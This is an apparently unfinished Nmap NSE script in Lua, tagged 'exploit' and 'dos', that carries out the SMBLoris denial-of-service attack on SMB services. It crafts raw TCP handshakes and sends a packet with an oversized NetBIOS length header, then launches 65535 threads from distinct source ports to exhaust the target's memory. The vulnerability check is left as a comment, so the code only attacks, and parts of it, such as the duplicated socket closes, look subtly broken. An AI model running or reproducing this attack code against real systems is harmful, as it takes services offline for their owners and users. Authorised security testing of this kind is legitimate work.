local nmap = require "nmap"
local smb = require "smb"
local stdnse = require "stdnse"
local vulns = require "vulns"
local packet = require "packet"
local ipOps = require "ipOps"

description = [[
SMBLoris

TODO: Enable support for ARP poisoning using dnet interface
]]
---
--@usage
--
--@output
--
-- @xmloutput

author = "Paulino Calderon, Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit", "dos"}

local curr_src_port = "0x401"
local mutex = nmap.mutex(curr_src_port)

hostrule = function(host)
  return smb.get_port(host) ~= nil
end

--  the following are in KB
--  MAX RAM is 24TB as of now according to
--  https://www.groovypost.com/news/microsoft-increases-ram-limit-in-windows-server-2016-to-24-tbs/
-- MAX RAM (modify as needed) (24TB)
local MAX_RAM = 24000000000
-- RAM per connection (128kb)
local RAM_PER_CONN = 128

--- Pcap check function
-- @return Destination and source IP addresses and TCP ports
local check = function(layer3)
  local ip = packet.Packet:new(layer3, layer3:len())
  return string.pack('zz=H=H', ip.ip_bin_dst, ip.ip_bin_src, ip.tcp_dport, ip.tcp_sport)
end


--- Updates a TCP Packet object
-- @param tcp The TCP object
local updatepkt = function(tcp)
  tcp:tcp_count_checksum(tcp.ip_len)
  tcp:ip_count_checksum()
end


local function syn_pkt(host, port, src_port)
  local pkt = stdnse.fromhex(
    "4500 002c 55d1 0000 8006 0000 0000 0000" ..
    "0000 0000 0000 0000 0000 0000 0000 0000" ..
    "6002 0c00 0000 0000 0204 05b4"
  )

  local tcp = packet.Packet:new(pkt, pkt:len())
  tcp:ip_set_bin_src(host.bin_ip_src)
  tcp:ip_set_bin_dst(host.bin_ip)
  tcp:tcp_set_dport(port)
  tcp:tcp_set_sport(src_port)
  tcp:tcp_set_seq(math.random(1, 0x7fffffff))

  updatepkt(tcp)

  return tcp
end

local function dos_pkt(host, port, src_port, seq_num)
  local pkt = stdnse.fromhex(
    "4500 002c 5310 0000 8006 47cf c0a8 0f01" ..
    "c0a8 0f9b 1250 01bd 0000 0001 f01c 88be" ..
    "5010 16d0 6c29 0000 0001 ffff"
  )

  local tcp = packet.Packet:new(pkt, pkt:len())
  tcp:ip_set_bin_src(host.bin_ip_src)
  tcp:ip_set_bin_dst(host.bin_ip)
  tcp:tcp_set_dport(port)
  tcp:tcp_set_sport(src_port)
  tcp:tcp_set_seq(seq_num + 1)
  updatepkt(tcp)

  return tcp
end


local function send_dos(host, port)
  -- set IP and src port, increment the mutex
  local src_port
  mutex "lock"
    src_port = tonumber(curr_src_port)
    curr_src_port = tostring(src_port + 1)
  mutex "done"
  -- make tcp SYN packet and send
  local sock = nmap.new_dnet()
  local pcap = nmap.new_socket()
  local saddr = ipOps.str_to_ip(host.bin_ip_src)
  local daddr = ipOps.str_to_ip(host.bin_ip)
  local try = nmap.new_try()

  try(sock:ip_open())

  try = nmap.new_try(function() sock:ip_close() end)

  pcap:pcap_open(host.interface, 104, false, "tcp and dst host " .. saddr .. " and src host " .. daddr .. " and src port " .. src_port)

  pcap:set_timeout(host.times.timeout * 1000)

  local syn = syn_pkt(host, port, src_port)

  try(sock:ip_send(syn.buf, host))

  local status, len, _, layer3 = pcap:pcap_receive()
  local test = string.pack('zz=H=H', syn.ip_bin_src, syn.ip_bin_dst,
    syn.tcp_sport, syn.tcp_dport)
  while status and test ~= check(layer3) do
    status, len, _, layer3 = pcap:pcap_receive()
  end

  local seq = packet.u32(layer3, 24)

  local dos = dos_pkt(host, port, src_port, seq)
  try(sock:ip_send(dos.buf, host))
  pcap:close()
  sock:ip_close()

  pcap:close()
  sock:ip_close()
end

action = function(host)
  port = smb.get_port(host)
  for i=1,65535 do
    local co = stdnse.new_thread(send_dos, host, port)
  end
  -- if vuln, stop the DoS and show vuln to user

end




